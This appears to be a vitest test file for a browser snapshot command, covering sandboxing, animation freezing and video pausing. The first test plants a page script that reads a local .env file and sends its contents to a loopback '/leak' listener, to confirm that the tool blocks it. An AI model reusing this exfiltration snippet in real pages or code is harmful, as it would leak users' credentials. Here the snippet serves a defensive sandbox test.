/**
 * `swarmloom snapshot` of local HTML files and web pages against a real browser, with the test double of
 * the snapshot script. Skipped (with the reason) when the machine has no Chrome; under CI that fails
 * instead (see ./real-deps), and a wrong SWARMLOOM_CHROME always does.
 */

import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { snapshotCommand } from "../src/commands/snapshot";
import { findBrowser } from "../src/discovery/browser";
import { systemHost } from "../src/discovery/host";
import { findOptional, skipReason } from "./real-deps";

const SNAPSHOT_DOUBLE = path.join(import.meta.dirname, "fixtures/snapshot.js");
/**
 * 2 s, 2 fps, 16x16 VP9, as a data: URL so it is seekable to any time (a server without range requests
 * allows only 0). `ffmpeg -f lavfi -i testsrc2=size=16x16:rate=2:duration=2 -c:v libvpx-vp9 -b:v 10k`
 */
const CLIP =
  "data:video/webm;base64," +
  "GkXfo59ChoEBQveBAULygQRC84EIQoKEd2VibUKHgQJChYECGFOAZwEAAAAAAANoEU2bdLpNu4tTq4QVSalmU6yBoU27i1OrhBZU" +
  "rmtTrIHGTbuMU6uEElTDZ1OsggETTbuMU6uEHFO7a1OsggNS7AEAAAAAAABZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVSalmoCrXsYMPQkBNgIRM" +
  "YXZmV0GETGF2ZkSJiECfQAAAAAAAFlSua8iuAQAAAAAAAD/XgQFzxYgAAAAAAAAAAZyBACK1nIN1bmSIgQCGhVZfVlA5g4EBI+OD" +
  "hB3NZQDgkLCBELqBEJqBAlWwhFW5gQESVMNn1HNz0WPAi2PFiAAAAAAAAAABZ8icRaOHRU5DT0RFUkSHj0xhdmMgbGlidnB4LXZw" +
  "OWfIoUWjiERVUkFUSU9ORIeTMDA6MDA6MDIuMDAwMDAwMDAwAB9DtnVB4OeBAKNBFYEAAICCSYNCAADwAPYAOCQcGEIAACAgAHxk" +
  "0v//kDq8D8+qkaGs4//JQxsI3/u46WxXDTaLnn//9xawII6zKme1fu7dX//1FZh6+uvcNvLHC9CfhABtMv/3r51JQEj3t/kBMjky" +
  "3CvduZ1TdN+9rK1rm6v/0i3jXITM12CmOfanFVFpOiJUv/8T1b0n8b6cODpPXpQ9zcrZI5fv0VOqgFZw6Zs6iZq33wB91JFbH9ay" +
  "76qXK/+v+iJ12870ebazr8AobxLwl53uaZvJBx26VTfey3R2c86quJK+M92g+L9+YgWpvpRdf2/jbT6Z8BO/JxTOXSzf/TdGZ99R" +
  "jpr8Qk3rvEPjbj84lvNJRF+H1rg7FYdmQACjzYEB9ACGAECSnBBJQAADAAAAZWYS3//RnKML//mjIA1M6vlmQF0P8sf//+dlPY57" +
  "ZdWP7I/xjuis0Dy8X7RuMNTbyHHdcw9G9Q8MFdWAo72BA+gAhgBAkpwQSsAAA3AAAG4SMtjgT//2Qr+MNXWFfy2//MgoODq9Bfr2" +
  "2B688do/u6Rpne/1Ee7lHtkAo7WBBdwAhgBAkpwQScAAAwAAABO/fKVbZl8GEogFKWYyf9jkFymkDqvBosdTxM5hTgaELdOiABxT" +
  "u2uRu4+zgQC3iveBAfGCAWzwgQM=";
const chrome = (await findOptional("SWARMLOOM_CHROME", () => findBrowser(systemHost())))?.path;
const missing = skipReason(chrome ? undefined : "no Chrome/Chromium found (set SWARMLOOM_CHROME)");

describe.skipIf(missing)(`snapshot in a real browser${missing ? ` (skipped: ${missing})` : ""}`, () => {
  it("keeps the page's scripts and requests away from the folder and other sites", async () => {
    const hits: string[] = [];
    const listener = createServer((req, res) => {
      hits.push(req.url ?? "");
      res.end();
    });
    await new Promise<void>((resolve) => listener.listen(0, "127.0.0.1", resolve));
    const leak = `http://127.0.0.1:${(listener.address() as AddressInfo).port}/leak`;
    const dir = await mkdtemp(path.join(tmpdir(), "swarmloom-snapshot-"));
    try {
      await writeFile(path.join(dir, ".env"), "API_KEY=topsecret");
      await writeFile(
        path.join(dir, "page.html"),
        `<!doctype html><title>t</title><p id="out">static text</p><img src="${leak}?img">
<script>fetch(".env").then((r) => r.text()).then((t) => {
  document.getElementById("out").textContent = "READ " + t;
  fetch("${leak}?d=" + encodeURIComponent(t), { mode: "no-cors" });
});</script>`,
      );
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [path.join(dir, "page.html"), "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: dir,
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const json = out.join("\n");
      expect(json).toContain("static text");
      expect(json).not.toContain("topsecret");
      expect(hits).toEqual([]);
    } finally {
      listener.close();
      await rm(dir, { recursive: true, force: true });
    }
  }, 120_000);

  it("captures animations in a pose that does not depend on when the capture ran", async () => {
    const dir = await mkdtemp(path.join(tmpdir(), "swarmloom-snapshot-"));
    try {
      // Body margin 8 px. A finite slide ends at +100 px; endless ones in the document and an open
      // shadow root pause half a cycle in, at +150 px and 150 px wide.
      await writeFile(
        path.join(dir, "page.html"),
        `<!doctype html><title>t</title><style>
@keyframes a { from { transform: translateX(0) } to { transform: translateX(100px) } }
@keyframes b { from { transform: translateX(0) } to { transform: translateX(300px) } }
h1 { animation: a 60s linear forwards } p { animation: b 1s linear infinite }
#shadow { display: inline-block; animation: none }
</style><h1>once</h1><h1 id="shadow">shadow<template shadowrootmode="open"><style>
@keyframes inside { from { width: 0 } to { width: 300px } }
.inner { display: block; height: 1px; animation: inside 1s linear infinite }
</style><span class="inner"></span></template></h1><p>loop</p>`,
      );
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [path.join(dir, "page.html"), "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: dir,
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const { layers } = JSON.parse(out.join("\n")) as { layers: { text: string; box: { x: number; w: number } }[] };
      expect(layers.map((l) => [l.text, Math.round(l.box.x)])).toEqual([
        ["once", 108],
        ["shadow", 8],
        ["loop", 158],
      ]);
      expect(Math.round(layers.find((l) => l.text === "shadow")?.box.w ?? 0)).toBe(150);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }, 120_000);

  it("stops playing videos in the same pose as animations", async () => {
    const page = `<!doctype html><title>t</title>
<video id="loop" autoplay muted loop playsinline src="${CLIP}"></video>
<video id="once" autoplay muted playsinline src="${CLIP}"></video><p id="out"></p>
<script>
const videos = [...document.querySelectorAll("video")];
const show = () => { document.getElementById("out").textContent = videos.map((v) => v.id + " " + v.paused + " " + (v.currentTime / v.duration).toFixed(2)).join(", "); };
for (const v of videos) for (const type of ["playing", "pause", "seeked"]) v.addEventListener(type, show);
</script>`;
    const server = createServer((_req, res) => res.setHeader("content-type", "text/html").end(page));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    try {
      const url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/`;
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [url, "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: tmpdir(),
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const { layers } = JSON.parse(out.join("\n")) as { layers: { text: string }[] };
      // Loops half a cycle in, single runs at their end.
      expect(layers.map((l) => l.text)).toEqual(["loop true 0.50, once true 1.00"]);
    } finally {
      server.close();
    }
  }, 120_000);
});
